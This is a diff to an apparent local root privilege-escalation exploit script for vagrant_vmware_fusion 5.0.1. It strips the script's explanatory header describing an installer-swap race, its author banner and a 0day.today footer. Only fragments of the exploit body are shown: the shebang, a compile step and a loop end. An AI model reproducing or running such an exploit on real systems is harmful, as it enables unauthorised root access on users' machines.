@@ -1,25 +1,4 @@
-# I recently blogged about how the installation process of version 5.0.0 of this
-# plugin could be hihacked by a local attacker or malware in order to escalate
-# privileges to root.  Hashicorp pushed some mitigations for this issue fairly
-# quickly but unfortunately 5.0.1 is still exploitable with a slightly different
-# approach.
-  
-# They removed the chmod/chown shell commands from their osascript invocation and
-# instead simply executed their installer as root, but apparently didn't realise
-# that the installer is not root-owned so can be swapped out by a local attacker
-# during the process.
-  
-# This issue is fixed in version 5.0.2.
-  
-# https://m4.rkw.io/vagrant_vmware_privesc_5.0.1.sh.txt
-# c38ecc9fdb4f37323338e8fd12b851133a2121f3505cde664e6d32f1ef49ba23
-# -----------------------------------------------------------------------------
 #!/bin/bash
-echo "########################################"
-echo "vagrant_vmware_fusion 5.0.1 root privesc"
-echo "by m4rkw"
-echo "########################################"
-echo
 echo "compiling..."
   
 cat > vvf.c <<EOF
@@ -77,5 +56,3 @@ do
     exit 0
   fi
 done
- 
-#  0day.today [2023-02-20]  #
